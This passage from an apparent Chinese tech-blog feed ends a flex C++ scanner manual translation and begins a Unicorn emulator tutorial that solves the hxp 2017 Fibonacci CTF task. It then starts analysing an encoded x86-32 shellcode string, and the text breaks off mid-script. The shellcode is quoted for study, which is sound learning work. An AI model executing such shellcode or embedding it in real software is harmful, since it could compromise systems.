FlexLexer.h，该文件定义了两个C++类的接口。</p><p>在FlexLexer.h中的第一个类是FlexLexer，它提供定义基本扫描程序类接口的抽象基类。它提供以下成员函数：</p><ul><li><code>const char* YYText()</code></li></ul><p>返回最近匹配的token的文本，与yytext等效。</p><ul><li><code>int YYLeng()</code></li></ul><p>返回最近匹配的token的长度，与yyleng等效。</p><ul><li><code>int lineno() const</code></li></ul><p>返回当前输入行号(参考 %option yylineno)，如果未使用 ％option yylineno，则返回1。</p><ul><li><code>void set_debug( int flag )</code></li></ul><p>设置scanner的调试flag，等效于分配给 yy_flex_debug(参考<a href="http://westes.github.io/flex/manual/Scanner-Options.html#Scanner-Options" target="_blank" rel="noopener">Scanner Options</a>),注意必须使用％option debug来构建扫描程序，才能在其中包含调试信息。</p><ul><li><code>int debug() const</code></li></ul><p>返回调试标志的当前设置。</p><p>还提供了等效于yy_switch_to_buffer(),yy_create_buffer()(尽管第一个参数是istream＆对象的引用，而不是FILE *)，yy_flush_buffer(),yy_delete_buffer()和yyrestart()(第一个参数依旧是istream＆对象的引用)的成员函数。</p><p>在FlexLexer.h中的第二个类是yyFlexLexer，它是从FlexLexer派生的。它定义了以下附加成员函数：</p><ul><li><code>yyFlexLexer( istream* arg_yyin = 0, ostream* arg_yyout = 0 )</code></li><li><code>yyFlexLexer( istream&amp; arg_yyin, ostream&amp; arg_yyout )</code></li></ul><p>使用给定的输入和输出流构造yyFlexLexer对象。如果未指定，则流分别默认为cin和cout。yyFlexLexer不拥有其流参数的所有权。用户有责任确保所指向的流至少在yyFlexLexer实例中保持有效。</p><ul><li><code>virtual int yylex()</code></li></ul><p>yylex()和原始的flex scanner起着相同的作用:它会扫描输入流并消耗令牌(tokens)，直到rule的action返回一个值。如果你从yyFlexLexer派生一个子类S并想要在yylex()里访问S的成员函数和变量，则需要使用％option yyclass =”S”通知flex您将使用该子类而不是yyFlexLexer。</p><p>在这种情况下，Flex不会生成yyFlexLexer::yylex()，而是会生成S::yylex()(并且还会生成一个dummy yyFlexLexer::yylex()，如果调用它，则会调用yyFlexLexer::LexerError。</p><ul><li><code>virtual void switch_streams(istream* new_in = 0, ostream* new_out = 0)</code></li><li><code>virtual void switch_streams(istream&amp; new_in, ostream&amp; new_out)</code></li></ul><p>重新分配yyin到new_in(如果非空)，重新分配yyout到new_out(如果非空)，如果重新分配yyin，则删除先前的输入缓冲区。</p><ul><li><code>int yylex( istream* new_in, ostream* new_out = 0 )</code></li><li><code>int yylex( istream&amp; new_in, ostream&amp; new_out )</code></li></ul><p>首先通过switch_streams(new_in，new_out)切换输入流，然后返回yylex()的值。</p><p>此外，yyFlexLexer定义了以下受保护的虚函数，您可以在派生类中重新定义它们以定制scanner：</p><ul><li><code>virtual int LexerInput( char* buf, int max_size )</code></li></ul><p>将最多max_size个字符读取到buf中，并返回读取的字符数。为了表示输入结束，返回0。<br>注意interactive scanner(参考”<a href="http://westes.github.io/flex/manual/Scanner-Options.html#Scanner-Options" target="_blank" rel="noopener">Scanner Options</a>中的’ -B’和’-I’ flag)定义宏YY_INTERACTIVE。<br>如果重新定义LexerInput()并需要根据scanner是否正在扫描interactive input source而采取不同的操作，则可以通过#ifdef语句测试此名称的存在。</p><ul><li><p><code>virtual void LexerOutput( const char* buf, int size )</code><br>从缓冲区buf中写出size个字符，如果scanner的rules可以匹配带有NUL的text，则该文本在NUL终止时也可能包含内部NUL。(？)<br>上句原句:writes out <code>size</code> characters from the buffer <code>buf</code>, which, while <code>NUL</code>-terminated, may also contain internal <code>NUL</code>s if the scanner’s rules can match text with <code>NUL</code>s in them.</p></li><li><p><code>virtual void LexerError( const char* msg )</code><br>报告致命错误消息。该函数的默认版本将message写入流cerr并退出。</p></li></ul><p>注意yyFlexLexer对象包含其整个扫描状态。因此，您可以使用此类对象创建可重入的scanner，但另请参考<a href="http://westes.github.io/flex/manual/Reentrant.html#Reentrant" target="_blank" rel="noopener">Reentrant</a>。你可以实例化同一yyFlexLexer类的多个实例，并且你还可以使用上述的”-P”选项在同一程序中将多个C++ scanner类组合在一起。</p><p>最后，请注意％array功能不适用于C++扫描程序类，你必须使用％pointer(默认设置)。<br>这是一个简单的C++ scanner的示例:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; An example of using the flex C++ scanner class.</span><br><span class="line"></span><br><span class="line">    %&#123;</span><br><span class="line">    #include &lt;iostream&gt;</span><br><span class="line">    using namespace std;</span><br><span class="line">    int mylineno &#x3D; 0;</span><br><span class="line">    %&#125;</span><br><span class="line"></span><br><span class="line">    %option noyywrap c++</span><br><span class="line"></span><br><span class="line">    string  \&quot;[^\n&quot;]+\&quot;</span><br><span class="line"></span><br><span class="line">    ws      [ \t]+</span><br><span class="line"></span><br><span class="line">    alpha   [A-Za-z]</span><br><span class="line">    dig     [0-9]</span><br><span class="line">    name    (&#123;alpha&#125;|&#123;dig&#125;|\$)(&#123;alpha&#125;|&#123;dig&#125;|[_.\-&#x2F;$])*</span><br><span class="line">    num1    [-+]?&#123;dig&#125;+\.?([eE][-+]?&#123;dig&#125;+)?</span><br><span class="line">    num2    [-+]?&#123;dig&#125;*\.&#123;dig&#125;+([eE][-+]?&#123;dig&#125;+)?</span><br><span class="line">    number  &#123;num1&#125;|&#123;num2&#125;</span><br><span class="line"></span><br><span class="line">    %%</span><br><span class="line"></span><br><span class="line">    &#123;ws&#125;    &#x2F;* skip blanks and tabs *&#x2F;</span><br><span class="line"></span><br><span class="line">    &quot;&#x2F;*&quot;    &#123;</span><br><span class="line">            int c;</span><br><span class="line"></span><br><span class="line">            while((c &#x3D; yyinput()) !&#x3D; 0)</span><br><span class="line">                &#123;</span><br><span class="line">                if(c &#x3D;&#x3D; &#39;\n&#39;)</span><br><span class="line">                    ++mylineno;</span><br><span class="line"></span><br><span class="line">                else if(c &#x3D;&#x3D; &#39;*&#39;)</span><br><span class="line">                    &#123;</span><br><span class="line">                    if((c &#x3D; yyinput()) &#x3D;&#x3D; &#39;&#x2F;&#39;)</span><br><span class="line">                        break;</span><br><span class="line">                    else</span><br><span class="line">                        unput(c);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">    &#123;number&#125;  cout &lt;&lt; &quot;number &quot; &lt;&lt; YYText() &lt;&lt; &#39;\n&#39;;</span><br><span class="line"></span><br><span class="line">    \n        mylineno++;</span><br><span class="line"></span><br><span class="line">    &#123;name&#125;    cout &lt;&lt; &quot;name &quot; &lt;&lt; YYText() &lt;&lt; &#39;\n&#39;;</span><br><span class="line"></span><br><span class="line">    &#123;string&#125;  cout &lt;&lt; &quot;string &quot; &lt;&lt; YYText() &lt;&lt; &#39;\n&#39;;</span><br><span class="line"></span><br><span class="line">    %%</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; This include is required if main() is an another source file.</span><br><span class="line">&#x2F;&#x2F;#include &lt;FlexLexer.h&gt;</span><br><span class="line"></span><br><span class="line">    int main( int &#x2F;* argc *&#x2F;, char** &#x2F;* argv *&#x2F; )</span><br><span class="line">    &#123;</span><br><span class="line">        FlexLexer* lexer &#x3D; new yyFlexLexer;</span><br><span class="line">        while(lexer-&gt;yylex() !&#x3D; 0)</span><br><span class="line">            ;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>如果要创建多个(不同)词法分析器类，你可以使用”-P”标志(或者是prefix=选项), 将每个yyFlexLexer重命名为其他一些”xxFlexLexer”。然后你可以将<code>&lt;FlexLexer.h&gt;</code>包含在你的其他每一个词法分析类(lexer class)源码中，首先按以下方式重命名yyFlexLexer：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#undef yyFlexLexer</span><br><span class="line">  #define yyFlexLexer xxFlexLexer</span><br><span class="line">  #include &lt;FlexLexer.h&gt;</span><br><span class="line"></span><br><span class="line">  #undef yyFlexLexer</span><br><span class="line">  #define yyFlexLexer zzFlexLexer</span><br><span class="line">  #include &lt;FlexLexer.h&gt;</span><br></pre></td></tr></table></figure><p>例如，如果你为一台scanner使用了％option prefix =”xx”，而另一台则使用％option prefix =”zz”。</p><h2 id="19-Reentrant-C-Scanners"><a href="#19-Reentrant-C-Scanners" class="headerlink" title="19 Reentrant C Scanners"></a>19 Reentrant C Scanners</h2><p>//todo</p><h2 id="20-Incompatibilities-with-Lex-and-Posix"><a href="#20-Incompatibilities-with-Lex-and-Posix" class="headerlink" title="20 Incompatibilities with Lex and Posix"></a>20 Incompatibilities with Lex and Posix</h2><p>//undo</p><h2 id="21-Memory-Management"><a href="#21-Memory-Management" class="headerlink" title="21 Memory Management"></a>21 Memory Management</h2><p>//todo</p><h2 id="22-Serialized-Tables"><a href="#22-Serialized-Tables" class="headerlink" title="22 Serialized Tables"></a>22 Serialized Tables</h2><p>//undo</p><h2 id="23-Diagnostics"><a href="#23-Diagnostics" class="headerlink" title="23 Diagnostics"></a>23 Diagnostics</h2><p>//todo</p><h2 id="24-Limitations"><a href="#24-Limitations" class="headerlink" title="24 Limitations"></a>24 Limitations</h2><p>//todo</p><h2 id="25-Additional-Reading"><a href="#25-Additional-Reading" class="headerlink" title="25 Additional Reading"></a>25 Additional Reading</h2><p>您可能希望阅读有关以下程序的更多信息：</p><ul><li>lex</li><li>yacc</li><li>sed</li><li>awk<br>以下书籍可能包含感兴趣的材料：<br>John Levine，Tony Mason和Doug Brown的《Lex＆Yacc》，O’Reilly和Associates。确保获得第二版。<br>ME Lesk和E.Schmidt的《LEX – Lexical Analyzer Generator》<br>Alfred Aho，Ravi Sethi和Jeffrey Ullman的《Compilers: Principles, Techniques and Tools》，Addison-Wesley(1986)描述flex(确定性有限自动机)使用的模式匹配技术。</li></ul><h2 id="Indices"><a href="#Indices" class="headerlink" title="Indices"></a>Indices</h2><p><a href="http://westes.github.io/flex/manual/Indices.html#Indices" target="_blank" rel="noopener">http://westes.github.io/flex/manual/Indices.html#Indices</a></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>Lexical Analysis With Flex, for Flex 2.6.2<br><a href="http://westes.github.io/flex/manual/" target="_blank" rel="noopener">http://westes.github.io/flex/manual/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;4-Some-Simple-Examples&quot;&gt;&lt;a href=&quot;#4-Some-Simple-Examples&quot; class=&quot;headerlink&quot; title=&quot;4 Some Simple Examples&quot;&gt;&lt;/a&gt;4 Some Simple Exampl
      
    
    </summary>
    
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="compiler" scheme="http://eternalsakura13.com/tags/compiler/"/>
    
      <category term="Lexical Analysis" scheme="http://eternalsakura13.com/tags/Lexical-Analysis/"/>
    
  </entry>
  
  <entry>
    <title>sakuraのall fuzz:afl-unicorn</title>
    <link href="http://eternalsakura13.com/2020/03/18/unicorn_learn/"/>
    <id>http://eternalsakura13.com/2020/03/18/unicorn_learn/</id>
    <published>2020-03-18T14:40:38.493Z</published>
    <updated>2020-04-06T03:09:12.039Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sakuraのall-fuzz-afl-unicorn"><a href="#sakuraのall-fuzz-afl-unicorn" class="headerlink" title="sakuraのall fuzz:afl-unicorn"></a>sakuraのall fuzz:afl-unicorn</h1><p>我一直以来都work在语法类fuzz上，产出了很多高质量的漏洞，但事实上我对其他fuzz所知甚少，这个系列权做对各类fuzz的思考和学习记录。</p><h2 id="unicorn学习"><a href="#unicorn学习" class="headerlink" title="unicorn学习"></a>unicorn学习</h2><p>主要是<a href="http://eternal.red/2018/unicorn-engine-tutorial/" target="_blank" rel="noopener">unicorn-engine-tutorial</a>这篇文章的学习和一些思考。</p><h3 id="task1"><a href="#task1" class="headerlink" title="task1"></a>task1</h3><p>hxp CTF 2017 Fibonacci<br>因为想折腾新玩意，所以顺便安装了一个ghrida，<a href="https://zhuanlan.zhihu.com/p/59637690" target="_blank" rel="noopener">教程</a>在这</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-03-18-160723.png" alt=""><br>这个程序整体来看就是输出打印flag，不过打印的非常非常慢。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMacBook-Pro:~&#x2F;unicorn$ .&#x2F;fibonacci</span><br><span class="line">The flag is: hxp&#123;F</span><br></pre></td></tr></table></figure><p>我们的目的是将这个程序用unicorn engine跑起来，那么就开始吧。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(name,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">u32</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">"I"</span>, data)[<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p32</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">"I"</span>, num)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化unicorn class</span></span><br><span class="line"><span class="comment"># 第一个参数是指定架构，第二个参数代表64位</span></span><br><span class="line">mu = Uc(UC_ARCH_X86, UC_MODE_64)</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-03-22-082326.png" alt=""><br>首先需要自己手动去初始化虚拟内存。<br>PS.说到这里我觉得很多对操作系统没什么概念或者学的很差的同学应该就不知道为什么了，这里给出两个资料，把相关部分都看完就理解了。<br><a href="https://www.bilibili.com/video/av69563153?p=77" target="_blank" rel="noopener">程序的表示、转换与链接</a> 关于可执行程序的装载和链接<br><a href="https://www.bilibili.com/video/av13398035?p=48" target="_blank" rel="noopener">程序的执行和存储访问</a> 关于虚拟内存<br><a href="https://www.bilibili.com/video/av74071598?p=6" target="_blank" rel="noopener">异常、中断和输入输出</a></p><p>贴张图，感兴趣的自己去看csapp。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-03-22-120401.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-03-22-120658.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-03-22-121124.png" alt=""><br>找到程序载入到虚拟内存的基地址，0x00400000，然后我们在0x0地址处分配一个栈。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BASE &#x3D; 0x400000</span><br><span class="line">STACK_ADDR &#x3D; 0x0</span><br><span class="line">STACK_SIZE &#x3D; 1024*1024</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mu.mem_map(BASE, 1024*1024)</span><br><span class="line">mu.mem_map(STACK_ADDR, STACK_SIZE)</span><br></pre></td></tr></table></figure><p>将程序load到基地址处，然后设置rsp指向stack。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mu.mem_write(BASE, read(&quot;.&#x2F;fibonacci&quot;))</span><br><span class="line">mu.reg_write(UC_X86_REG_RSP, STACK_ADDR + STACK_SIZE - 1)</span><br></pre></td></tr></table></figure><p>现在我们已经像真正加载可执行程序一样，将其加载到了内存中，现在我们就可以开始运行我们的仿真了。<br>现在确定一下想要仿真执行的起始地址和终止地址。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-03-22-082923.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-03-22-082942.png" alt=""><br>还是很好找的，0x004004e0-0x00400582</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mu.emu_start(0x00000000004004E0, 0x0000000000400582)</span><br></pre></td></tr></table></figure><p>unicorn在模拟执行程序的时候提供hook功能。<br>下面这个函数让我们在模拟执行每条指令之前打印出该指令的地址，指令大小。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def hook_code(mu, address, size, user_data):  </span><br><span class="line">    print(&#39;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size &#x3D; 0x%x&#39; %(address, size)) </span><br><span class="line"></span><br><span class="line">mu.hook_add(UC_HOOK_CODE, hook_code)</span><br></pre></td></tr></table></figure><p>最终组合就是下面这个脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(name,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">u32</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">"I"</span>, data)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p32</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">"I"</span>, num)</span><br><span class="line"></span><br><span class="line">mu = Uc(UC_ARCH_X86, UC_MODE_64)</span><br><span class="line">BASE = <span class="number">0x400000</span></span><br><span class="line">STACK_ADDR = <span class="number">0x0</span></span><br><span class="line">STACK_SIZE = <span class="number">1024</span>*<span class="number">1024</span></span><br><span class="line">mu.mem_map(BASE, <span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">mu.mem_map(STACK_ADDR, STACK_SIZE)</span><br><span class="line"></span><br><span class="line">mu.mem_write(BASE, read(<span class="string">"./fibonacci"</span>))</span><br><span class="line">mu.reg_write(UC_X86_REG_RSP, STACK_ADDR + STACK_SIZE - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_code</span><span class="params">(mu, address, size, user_data)</span>:</span></span><br><span class="line">    print(<span class="string">'&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x'</span> %(address, size))</span><br><span class="line"></span><br><span class="line">mu.hook_add(UC_HOOK_CODE, hook_code)</span><br><span class="line">mu.emu_start(<span class="number">0x00000000004004E0</span>, <span class="number">0x0000000000400582</span>)</span><br></pre></td></tr></table></figure><p>运行遇到如下问题，看一下0x4004ef这条指令为什么会访问到不可访问的地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~&#x2F;unicorn$ python3 fibonacci.py</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x4004e0, instruction size &#x3D; 0x1</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x4004e1, instruction size &#x3D; 0x1</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x4004e2, instruction size &#x3D; 0x2</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x4004e4, instruction size &#x3D; 0x5</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x4004e9, instruction size &#x3D; 0x2</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x4004eb, instruction size &#x3D; 0x4</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x4004ef, instruction size &#x3D; 0x7</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;fibonacci.py&quot;, line 31, in &lt;module&gt;</span><br><span class="line">    mu.emu_start(0x00000000004004E0, 0x0000000000400582)</span><br><span class="line">  File &quot;&#x2F;home&#x2F;sakura&#x2F;.local&#x2F;lib&#x2F;python3.6&#x2F;site-packages&#x2F;unicorn&#x2F;unicorn.py&quot;, line 288, in emu_start</span><br><span class="line">    raise UcError(status)</span><br><span class="line">unicorn.unicorn.UcError: Invalid memory read (UC_ERR_READ_UNMAPPED)</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-03-22-130050.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-03-22-130103.png" alt=""><br>BSS段属于静态内存分配。通常是指用来存放程序中未初始化的全局变量和未初始化的局部静态变量。未初始化的全局变量和未初始化的局部静态变量默认值是0，本来这些变量也可以放到data段的，但是因为它们都是0，所以它们在data段分配空间并且存放数据0是没有必要的。<br>在程序运行时，才会给BSS段里面的变量分配内存空间。<br>在目标文件(*.o)和可执行文件中，BSS段只是为未初始化的全局变量和未初始化的局部静态变量预留位置而已，它并没有内容，所以它不占据空间。</p><p>虽然我并不熟知unicorn的运作原理，这只是我第一次使用它，但我们是通过read的方式直接把可执行文件读进基地址的，想也知道bss段的内存肯定是没有被分配的。</p><p>所以这里的解决方案是直接在执行这些有问题的指令前，将其rip指向下一条指令，从而跳过这些地址。<br>此外因为我们没有把glibc加载到虚拟地址里，所以我们也不能调用glibc函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">instructions_skip_list = [<span class="number">0x00000000004004EF</span>, <span class="number">0x00000000004004F6</span>, <span class="number">0x0000000000400502</span>, <span class="number">0x000000000040054F</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_code</span><span class="params">(mu, address, size, user_data)</span>:</span>  </span><br><span class="line">    print(<span class="string">'&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x'</span> %(address, size))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> address <span class="keyword">in</span> instructions_skip_list:</span><br><span class="line">        mu.reg_write(UC_X86_REG_RIP, address+size)</span><br></pre></td></tr></table></figure><p>改一下hook函数就可以了。<br>然后因为我们需要打印出flag，而原本flag是通过如下函数打印的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_putc((<span class="keyword">int</span>)(<span class="keyword">char</span>)uVar3,(_IO_FILE *)<span class="built_in">stdout</span>)</span><br></pre></td></tr></table></figure><p>而此时_IO_putc是没有加载到内存中的，所以我们并不能调用这个函数。<br>但是可以看到要打印的flag作为第一个参数传递给该函数，而第一个参数是保存在rdi中的，所以只需要在执行这条指令之前读取rdi的值，然后把这个值打印出来即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_code</span><span class="params">(mu, address, size, user_data)</span>:</span>  </span><br><span class="line">...</span><br><span class="line">    <span class="keyword">elif</span> address == <span class="number">0x400560</span>:</span><br><span class="line">        c = mu.reg_read(UC_X86_REG_RDI)</span><br><span class="line">        print(chr(c))</span><br><span class="line">        mu.reg_write(UC_X86_REG_RIP, address+size)</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-03-22-132019.png" alt=""></p><p>其实对我来说能把程序用unicorn跑起来就算是完成任务了。<br>算法优化我并不感兴趣，所以看一下下一个task。</p><h3 id="task2"><a href="#task2" class="headerlink" title="task2"></a>task2</h3><p>分析如下shellcode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode &#x3D; &quot;\xe8\xff\xff\xff\xff\xc0\x5d\x6a\x05\x5b\x29\xdd\x83\xc5\x4e\x89\xe9\x6a\x02\x03\x0c\x24\x5b\x31\xd2\x66\xba\x12\x00\x8b\x39\xc1\xe7\x10\xc1\xef\x10\x81\xe9\xfe\xff\xff\xff\x8b\x45\x00\xc1\xe0\x10\xc1\xe8\x10\x89\xc3\x09\xfb\x21\xf8\xf7\xd0\x21\xd8\x66\x89\x45\x00\x83\xc5\x02\x4a\x85\xd2\x0f\x85\xcf\xff\xff\xff\xec\x37\x75\x5d\x7a\x05\x28\xed\x24\xed\x24\xed\x0b\x88\x7f\xeb\x50\x98\x38\xf9\x5c\x96\x2b\x96\x70\xfe\xc6\xff\xc6\xff\x9f\x32\x1f\x58\x1e\x00\xd3\x80&quot;</span><br></pre></td></tr></table></figure><p>先直接反汇编看一眼，嗯，看不懂。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-03-22-134056.png" alt=""><br>作者提示了这个shellcode所用的架构是x86-32，且明确说明了是使用了系统调用。<br>那基本思路就是hook一下int 80，然后把使用的系统调用号从eax里取出来，然后参数依序从ebx,ecx,edx里取出来。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-03-22-143523.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">mu = Uc(UC_ARCH_X86, 